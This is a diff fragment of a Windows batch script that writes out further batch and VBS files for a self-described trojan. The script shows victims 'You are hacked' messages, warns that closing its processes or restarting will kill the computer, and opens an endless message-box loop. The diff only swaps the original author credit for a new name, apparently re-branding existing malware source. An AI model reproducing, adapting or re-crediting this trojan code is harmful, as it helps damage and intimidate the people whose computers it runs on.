@@ -429,8 +429,8 @@ echo echo But first I want to say... >> LoveChoice.bat
 echo echo ........ >> LoveChoice.bat
 echo echo ..... >> LoveChoice.bat
 echo echo You are hacked my love!!! >> LoveChoice.bat
-echo echo info: This software was made by Da2dalus! >> LoveChoice.bat
-echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >> LoveChoice.bat
+echo echo info: This software was made by Frank Syd 20 >> LoveChoice.bat
+echo echo I am not responsible for the damage.U are a victim of my trojan. >> LoveChoice.bat
 echo echo Do not close Loveware or Lovewatch, this will kill your computer! >> LoveChoice.bat
 echo echo If you restart your computer now you wont be able to use it. >> LoveChoice.bat
 echo echo You will get a message when you can safely restart or reboot your computer. >> LoveChoice.bat
@@ -474,7 +474,7 @@ echo goto chaos >> yes.bat
 
 echo :makemsg >> yes.bat
 echo echo do > msg.vbs >> yes.bat
-echo echo Msgbox"I love you darling.....",0+0,"You are hacked!" >> msg.vbs >> yes.bat
+echo echo Msgbox"I love you darling.....",0+0,"You are hacked by Frank Syd 20!" >> msg.vbs >> yes.bat
 echo echo loop>>msg.vbs >> yes.bat
 echo goto startmsg >> yes.bat
 echo goto makemsg >> yes.bat
